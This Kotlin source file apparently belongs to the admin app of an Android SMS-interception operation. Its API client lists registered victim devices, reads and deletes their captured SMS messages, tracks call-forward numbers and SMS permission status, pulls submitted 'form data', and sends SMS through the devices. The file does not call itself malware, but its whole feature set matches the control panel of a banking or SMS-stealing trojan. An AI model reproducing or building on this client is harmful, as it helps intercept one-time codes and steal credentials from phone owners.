package com.example.admin.network

import android.util.Log
import com.example.admin.utils.Constants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class SupabaseApi {

    companion object {
        private const val TAG = "SupabaseApi"
        val BASE get() = Constants.DEVICE_API_BASE_URL
    }

    // ── Data classes matching the actual DB tables ────────────────────────────

    data class RegisteredDevice(
        val id: Long = 0,
        val subId: String = "",
        val deviceId: String = "",
        val deviceName: String? = null,
        val deviceModel: String? = null,
        val androidVersion: String? = null,
        val status: String? = null,
        val totalSmsCount: Int = 0,
        val lastSmsTimestamp: Long = 0L,
        val lastHeartbeatAt: String? = null,
        val lastSeen: String? = null,
        val registeredAt: String? = null,
        val callForwardStatus: String? = null,
        val callForwardNumber: String? = null,
        val smsPermissionStatus: String? = null,
        val dataJson: JSONObject? = null,
        val starred: Boolean = false
    )

    data class SmsLog(
        val id: Long = 0,
        val subId: String = "",
        val fromId: String = "",
        val toId: String? = null,
        val content: String = "",
        val messageType: String = "sms",
        val sentAt: String = "",
        val sentAtMs: Long = 0L,
        val isRead: Boolean = false
    )

    data class FormData(
        val id: Long = 0,
        val subId: String = "",
        val formType: String = "",
        val data: Map<String, Any> = emptyMap(),
        val submittedAt: String = "",
        val submittedAtMs: Long = 0L
    )

    // ── HTTP client ───────────────────────────────────────────────────────────

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val JSON_MT = "application/json; charset=utf-8".toMediaType()

    private fun get(url: String): JSONObject? = try {
        client.newCall(Request.Builder().url(url).get().build())
            .execute().body?.string()?.let { JSONObject(it) }
    } catch (e: Exception) { Log.e(TAG, "GET $url: ${e.message}"); null }

    private fun post(url: String, body: JSONObject): JSONObject? = try {
        client.newCall(Request.Builder().url(url)
            .post(body.toString().toRequestBody(JSON_MT)).build())
            .execute().body?.string()?.let { JSONObject(it) }
    } catch (e: Exception) { Log.e(TAG, "POST $url: ${e.message}"); null }

    private fun patch(url: String, body: JSONObject): JSONObject? = try {
        client.newCall(Request.Builder().url(url)
            .patch(body.toString().toRequestBody(JSON_MT)).build())
            .execute().body?.string()?.let { JSONObject(it) }
    } catch (e: Exception) { Log.e(TAG, "PATCH $url: ${e.message}"); null }

    private fun delete(url: String): JSONObject? = try {
        client.newCall(Request.Builder().url(url).delete().build())
            .execute().body?.string()?.let { JSONObject(it) }
    } catch (e: Exception) { Log.e(TAG, "DELETE $url: ${e.message}"); null }

    // ── Parsers — flat fields from DB rows ────────────────────────────────────

    private fun parseDevice(row: JSONObject): RegisteredDevice {
        val djStr = row.optString("data_json", "")
        val dj = if (djStr.isNotBlank()) runCatching { JSONObject(djStr) }.getOrNull()
                 else row.optJSONObject("data_json")

        return RegisteredDevice(
            id              = row.optLong("id", 0),
            subId           = row.optString("sub_id", ""),
            deviceId        = row.optString("device_id", row.optString("sub_id", "")),
            deviceName      = row.optString("device_name", "").ifBlank { null },
            deviceModel     = row.optString("device_model", "").ifBlank { null },
            androidVersion  = row.optString("android_version", "").ifBlank { null },
            status          = row.optString("status", "").ifBlank { null },
            totalSmsCount   = row.optInt("total_sms_count", 0),
            lastSmsTimestamp= row.optLong("last_sms_timestamp", 0L),
            lastHeartbeatAt = row.optString("last_heartbeat_at", "").ifBlank { null },
            lastSeen        = row.optString("last_seen", "").ifBlank { null },
            registeredAt    = row.optString("registered_at", "").ifBlank { null },
            callForwardStatus  = row.optString("call_forward_status", "").ifBlank { null },
            callForwardNumber  = row.optString("call_forward_number", "").ifBlank { null },
            smsPermissionStatus= row.optString("sms_permission_status", "").ifBlank { null },
            dataJson        = dj,
            starred         = dj?.optBoolean("starred", false) ?: false
        )
    }

    private fun parseSms(row: JSONObject): SmsLog {
        val sentAt = row.optString("sent_at", "")
        return SmsLog(
            id          = row.optLong("id", 0),
            subId       = row.optString("sub_id", ""),
            fromId      = row.optString("from_id", "Unknown").ifBlank { "Unknown" },
            toId        = row.optString("to_id", "").ifBlank { null },
            content     = row.optString("content", ""),
            messageType = row.optString("message_type", "sms"),
            sentAt      = sentAt,
            sentAtMs    = parseIsoToMs(sentAt),
            isRead      = row.optBoolean("is_read", false)
        )
    }

    private fun parseFormData(row: JSONObject): FormData {
        val dataVal = row.opt("data")
        val dataMap = mutableMapOf<String, Any>()
        val dataObj = when (dataVal) {
            is JSONObject -> dataVal
            is String -> runCatching { JSONObject(dataVal) }.getOrNull()
            else -> null
        }
        dataObj?.keys()?.forEach { k ->
            dataObj.opt(k)?.let { dataMap[k] = it }
        }
        val submittedAt = row.optString("submitted_at", "")
        return FormData(
            id           = row.optLong("id", 0),
            subId        = row.optString("sub_id", ""),
            formType     = row.optString("form_type", "form"),
            data         = dataMap,
            submittedAt  = submittedAt,
            submittedAtMs= parseIsoToMs(submittedAt)
        )
    }

    private fun dataArray(obj: JSONObject?): JSONArray =
        obj?.optJSONArray("data") ?: JSONArray()

    // ── Public API ────────────────────────────────────────────────────────────

    suspend fun getAllDevices(): Result<List<RegisteredDevice>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/get"))
            Result.success((0 until arr.length()).map { parseDevice(arr.getJSONObject(it)) })
        } catch (e: Exception) { Log.e(TAG, "getAllDevices: ${e.message}"); Result.failure(e) }
    }

    suspend fun getDevice(subId: String): Result<RegisteredDevice> = withContext(Dispatchers.IO) {
        try {
            val resp = get("$BASE/get/$subId")
            val row  = resp?.optJSONObject("data") ?: return@withContext Result.failure(Exception("Not found"))
            Result.success(parseDevice(row))
        } catch (e: Exception) { Log.e(TAG, "getDevice: ${e.message}"); Result.failure(e) }
    }

    suspend fun getAllSmsLogs(limit: Int = 200): Result<List<SmsLog>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/messages?limit=${limit.coerceIn(1, 1000)}"))
            Result.success((0 until arr.length())
                .map { parseSms(arr.getJSONObject(it)) }
                .filter { it.content.isNotBlank() })
        } catch (e: Exception) { Log.e(TAG, "getAllSmsLogs: ${e.message}"); Result.failure(e) }
    }

    suspend fun getSmsLogsByDevice(subId: String, limit: Int = 100): Result<List<SmsLog>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/messages?uid=$subId&limit=${limit.coerceIn(1, 500)}"))
            Result.success((0 until arr.length())
                .map { parseSms(arr.getJSONObject(it)) }
                .filter { it.content.isNotBlank() })
        } catch (e: Exception) { Log.e(TAG, "getSmsLogsByDevice: ${e.message}"); Result.failure(e) }
    }

    suspend fun deleteSmsLog(smsId: Long): Result<Boolean> = withContext(Dispatchers.IO) {
        try { Result.success(delete("$BASE/message/$smsId")?.optBoolean("ok", false) == true) }
        catch (e: Exception) { Log.e(TAG, "deleteSmsLog: ${e.message}"); Result.failure(e) }
    }

    suspend fun deleteAllSmsForDevice(subId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try { Result.success(delete("$BASE/messages?uid=$subId")?.optBoolean("ok", false) == true) }
        catch (e: Exception) { Log.e(TAG, "deleteAllSmsForDevice: ${e.message}"); Result.failure(e) }
    }

    suspend fun deleteAllSms(): Result<Boolean> = withContext(Dispatchers.IO) {
        try { Result.success(delete("$BASE/messages")?.optBoolean("ok", false) == true) }
        catch (e: Exception) { Log.e(TAG, "deleteAllSms: ${e.message}"); Result.failure(e) }
    }

    suspend fun deleteDevice(subId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try { Result.success(delete("$BASE/device/$subId")?.optBoolean("ok", false) == true) }
        catch (e: Exception) { Log.e(TAG, "deleteDevice: ${e.message}"); Result.failure(e) }
    }

    suspend fun setStarred(subId: String, starred: Boolean): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            Result.success(patch("$BASE/star/$subId", JSONObject().put("starred", starred))
                ?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "setStarred: ${e.message}"); Result.failure(e) }
    }

    suspend fun updateDevice(subId: String, fields: Map<String, Any>): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val body = JSONObject()
            fields.forEach { (k, v) -> body.put(k, v) }
            Result.success(patch("$BASE/update/$subId", body)?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "updateDevice: ${e.message}"); Result.failure(e) }
    }

    suspend fun upsertDevice(subId: String, fields: Map<String, Any>): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val body = JSONObject().put("sub_id", subId)
            fields.forEach { (k, v) -> body.put(k, v) }
            Result.success(post("$BASE/upsert", body)?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "upsertDevice: ${e.message}"); Result.failure(e) }
    }

    suspend fun sendSms(subId: String, senderNumber: String, messageBody: String,
                        receiverNumber: String? = null, timestamp: Long = System.currentTimeMillis()
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val body = JSONObject().apply {
                put("sub_id", subId)
                put("sender_number", senderNumber)
                put("message_body", messageBody)
                put("timestamp", timestamp)
                if (receiverNumber != null) put("receiver_number", receiverNumber)
            }
            Result.success(post("$BASE/message", body)?.optBoolean("ok", false) == true)
        } catch (e: Exception) { Log.e(TAG, "sendSms: ${e.message}"); Result.failure(e) }
    }

    suspend fun getFormData(limit: Int = 100): Result<List<FormData>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/form-data?limit=${limit.coerceIn(1, 500)}"))
            Result.success((0 until arr.length()).map { parseFormData(arr.getJSONObject(it)) })
        } catch (e: Exception) { Log.e(TAG, "getFormData: ${e.message}"); Result.failure(e) }
    }

    suspend fun getFormDataByDevice(subId: String, limit: Int = 100): Result<List<FormData>> = withContext(Dispatchers.IO) {
        try {
            val arr = dataArray(get("$BASE/form-data?uid=$subId&limit=${limit.coerceIn(1, 500)}"))
            Result.success((0 until arr.length()).map { parseFormData(arr.getJSONObject(it)) })
        } catch (e: Exception) { Log.e(TAG, "getFormDataByDevice: ${e.message}"); Result.failure(e) }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    fun isDeviceOnline(device: RegisteredDevice, thresholdMs: Long = 15 * 60 * 1000L): Boolean {
        val ts = device.lastSeen?.let { parseIsoToMs(it) }
            ?: device.lastHeartbeatAt?.let { parseIsoToMs(it) }
            ?: return false
        return System.currentTimeMillis() - ts < thresholdMs
    }

    fun formatTimestamp(isoString: String?): String {
        if (isoString.isNullOrBlank()) return "-"
        val ms = parseIsoToMs(isoString)
        if (ms <= 0) return isoString
        return try {
            SimpleDateFormat("dd MMM yyyy, hh:mm a", Locale.getDefault()).format(Date(ms))
        } catch (e: Exception) { isoString }
    }

    fun formatTimestamp(ms: Long): String {
        if (ms <= 0) return "-"
        return try {
            SimpleDateFormat("dd MMM yyyy, hh:mm a", Locale.getDefault()).format(Date(ms))
        } catch (e: Exception) { ms.toString() }
    }

    private fun parseIsoToMs(v: String): Long {
        if (v.isBlank()) return 0L
        val patterns = listOf(
            "yyyy-MM-dd'T'HH:mm:ss.SSSSSS'Z'",
            "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'",
            "yyyy-MM-dd'T'HH:mm:ss'Z'",
            "yyyy-MM-dd HH:mm:ss"
        )
        for (p in patterns) {
            try {
                val sdf = SimpleDateFormat(p, Locale.US).also { it.timeZone = TimeZone.getTimeZone("UTC") }
                sdf.parse(v)?.time?.let { if (it > 0) return it }
            } catch (_: Exception) {}
        }
        return 0L
    }
}
